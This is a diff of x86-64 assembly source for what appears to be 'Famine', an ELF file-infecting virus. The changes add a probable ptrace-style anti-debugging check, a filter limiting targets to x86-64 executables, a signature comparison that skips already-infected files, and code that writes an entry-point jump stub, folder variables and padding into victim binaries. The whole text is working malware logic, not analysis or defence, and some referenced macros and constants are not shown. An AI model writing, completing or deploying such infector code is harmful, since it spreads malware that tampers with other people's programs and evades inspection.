@@ -13,7 +13,15 @@ _famine:
     PUSH
     mov rbp, rsp
     sub rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
+    mov rdi, 0
+    mov rsi, 0
+    mov rdx, 1
+    mov r10, 0
+    syscall
+    cmp rax, 0
+    jge target_dir
     mov r14, 1
+    ; mov [rsp],  
 
 target_dir:
     .f1:
@@ -125,11 +133,10 @@ elf_header:
     jne clear
     .exec:
         cmp word [rsi + Elf64_Ehdr.e_type], ET_EXEC        
-        je elf_phdr
-    ; .dyn:                                                 ; NOT YET ?
-        ; cmp word [rsi + Elf64_Ehdr.e_type], ET_DYN
-        ; je elf_phdr
-    ; if (ehdr->e_machine != EM_X86_64)                     NEED TO ADD THIS PROBABLY.
+        je .machine
+    .machine:
+        cmp word [rsi + Elf64_Ehdr.e_machine], 62
+        je elf_sign
     jmp clear
 %ifdef DEBUG
     mov rsi, [rbp - 16]
@@ -138,7 +145,16 @@ elf_header:
     dbg [rel hook.v_size], FAMINE_SIZE
     mov rsi, [rbp - 16]
 %endif
-
+; JUMP
+elf_sign:
+    add rsi, FAMINE_SIZE + 0x6c
+    ; lea rsi, [rsi]
+    lea rdi, [rel hook.SIGN]
+    mov rcx, 38
+    cld
+    repe cmpsb
+    je clear
+    mov rsi, [rbp - 16]
 ; rsi = e_hdr
 elf_phdr:
     mov rdx, rsi
@@ -230,14 +246,13 @@ mimic:
 ;write opcode to jump to actualy entry
     mov [rbp - 32], word 0xb848                                     ; mov rax
     mov [rbp - 22], word 0xe0ff                                     ; jmp rax
+;write vars
     write_rel r8, [rbp - 32], 0xc
-    write_rel r8, [rel hook.folder_1], 11
-    write_rel r8, [rel hook.folder_2], 12
-    write_rel r8, [rel hook.TMP], 10
-; write padding
+    write_rel r8, [rel hook.folder_1], 70
+;write padding
     PAGE_ALIGN FAMINE_SIZE
     sub rcx, FAMINE_SIZE
-    sub rcx, 45                                                     ; jmp entry + vars
+    sub rcx, 82                                                     ; jmp entry + vars
     mov r9, rcx
     .loop:
         cmp r9, 0
@@ -305,6 +320,8 @@ hook:
         db FOLDER_2, 0
     .TMP:
         db TMP, 0
+    .SIGN:
+        db SIGNATURE, 0
     .null:
         db 0
 %ifdef DEBUG
